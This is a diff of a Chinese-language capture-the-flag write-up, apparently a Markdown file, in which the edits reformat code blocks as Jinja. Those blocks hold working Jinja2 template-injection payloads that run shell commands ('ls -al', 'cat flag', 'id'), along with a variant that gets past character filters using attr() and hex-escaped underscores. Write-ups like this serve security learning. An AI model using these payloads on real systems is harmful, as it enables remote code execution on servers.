@@ -3,9 +3,15 @@
 ![image](https://github.com/user-attachments/assets/119de55d-3919-4169-a731-c784e14b5a0e)
 
 
-`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -al').read() }}`
+```jinja
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -al').read() }}
+```
+
 ![image](https://github.com/user-attachments/assets/7fa5996c-37dc-4787-9e04-f8ff16551076)
-`{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}`
+
+```jinja
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
+```
 ![image](https://github.com/user-attachments/assets/8bccdcd5-e1bb-429e-a875-af32b20c4bb5)
 
 ---
@@ -17,7 +23,7 @@
 
 ### 初步嘗試
 我使用了典型的 Python Jinja2 RCE payload 嘗試取得系統資訊
-```
+```jinja
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 伺服器回傳
@@ -33,7 +39,7 @@
 - 使用 `attr()` 函式來取代點記法；
 - 用十六進位表示字串（例如 `__` → `\x5f\x5f`）來繞過字元過濾。
 統整出
-```
+```jinja
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
 ```
 運作原理如下：
